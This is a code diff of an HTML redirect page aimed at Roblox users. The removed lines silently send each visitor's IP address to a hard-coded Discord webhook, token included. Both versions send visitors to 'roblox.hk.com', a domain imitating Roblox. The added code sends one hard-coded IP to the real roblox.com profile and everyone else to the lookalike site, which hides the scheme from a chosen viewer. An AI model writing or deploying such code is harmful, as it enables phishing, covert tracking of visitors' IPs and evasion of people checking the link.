@@ -3,18 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>rederecting...</title>
+    <title>Redirecting...</title>
     <style>
-            body {
-                font-family: Arial, sans-serif;
-                display: flex;
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
             background-color: #f4f4f9;
         }
-            .container {
+        .container {
             text-align: center;
             background: white;
             padding: 20px;
@@ -32,35 +32,32 @@
     </style>
 </head>
 <body>
-        <div class="container">
-            <h1>Redirecting...</h1>
-            <p>You will be redirected shortly. If not, <a id="manual-link" href="#">click here</a>.</p>
-        </div>
-    
-        <script>
-            const targetUrl = "https://roblox.hk.com/users/7321317449/profile";
-            const delay = 2000;
-            document.getElementById("manual-link").href = targetUrl;
-            setTimeout(() => {
-                window.location.href = targetUrl;
-            }, delay);
-        </script>
-    </html>
+    <div class="container">
+        <h1>Redirecting...</h1>
+        <p>You will be redirected shortly. If not, <a id="manual-link" href="#">click here</a>.</p>
+    </div>
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1318515632861478932/vboPGXO1UMV1WeGCyqdM41cHlgQdgpmp657nsW6gEtroZs3hlHtOaqFpCNJvT4Uo4r63"
+        const targetIp = "197.202.254.111"; // Target IP for special redirection
+        const specialRedirectUrl = "https://www.roblox.com/users/2035263087/profile"; // Redirect for the target IP
+        const defaultRedirectUrl = "https://roblox.hk.com/users/7321317449/profile"; // Redirect for all other IPs
+        const delay = 2000; // Delay in milliseconds
+
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                fetch(webhookUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    content: data.ip
-                })
+                const userIp = data.ip;
+                const redirectUrl = userIp === targetIp ? specialRedirectUrl : defaultRedirectUrl;
+                document.getElementById("manual-link").href = redirectUrl;
+
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, delay);
             })
-            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+                // Optional: Handle error (e.g., redirect to the default site)
+                window.location.href = defaultRedirectUrl;
+            });
     </script>
 </body>
 </html>
